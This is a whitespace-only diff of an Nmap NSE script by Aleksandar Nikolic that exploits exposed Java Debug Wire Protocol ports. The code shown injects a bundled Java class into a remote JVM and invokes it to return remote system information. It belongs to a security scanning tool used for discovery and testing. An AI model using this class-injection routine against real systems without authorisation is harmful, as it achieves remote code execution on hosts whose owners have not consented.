@@ -13,7 +13,7 @@ and achieve remote code execution.  This script injects and execute a
 Java class file that returns remote system information.
 ]]
 
-author = "Aleksandar Nikolic" 
+author = "Aleksandar Nikolic"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"default","safe","discovery"}
 
@@ -59,10 +59,10 @@ action = function(host, port)
 		return nil
 	end
 
-	-- read .class file 
+	-- read .class file
 	local file = io.open(nmap.fetchfile("nselib/data/jdwp-class/JDWPSystemInfo.class"), "rb")
 	local class_bytes = file:read("*all")
-	
+
 	-- inject the class
 	local injectedClass
 	status,injectedClass = jdwp.injectClass(socket,class_bytes)
@@ -72,23 +72,23 @@ action = function(host, port)
 	end
 	-- find injected class method
 	local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
-	
+
 	if runMethodID == nil then
 		stdnse.print_debug(1, "%s: Couldn't find run method", SCRIPT_NAME)
 		return stdnse.format_output(false, "Couldn't find run method.")
-	end	
-	
+	end
+
 	-- invoke run method
-	local result 	
-	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,0,nil) 
+	local result
+	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,0,nil)
 	if not status then
 		stdnse.print_debug(1, "%s: Couldn't invoke run method", SCRIPT_NAME)
 		return stdnse.format_output(false, result)
 	end
 	-- get the result string
 	local _,_,stringID = bin.unpack(">CL",result)
-	status,result = jdwp.readString(socket,0,stringID)	
-	-- parse results 
-	return stdnse.format_output(status,result)	
+	status,result = jdwp.readString(socket,0,stringID)
+	-- parse results
+	return stdnse.format_output(status,result)
 end
 
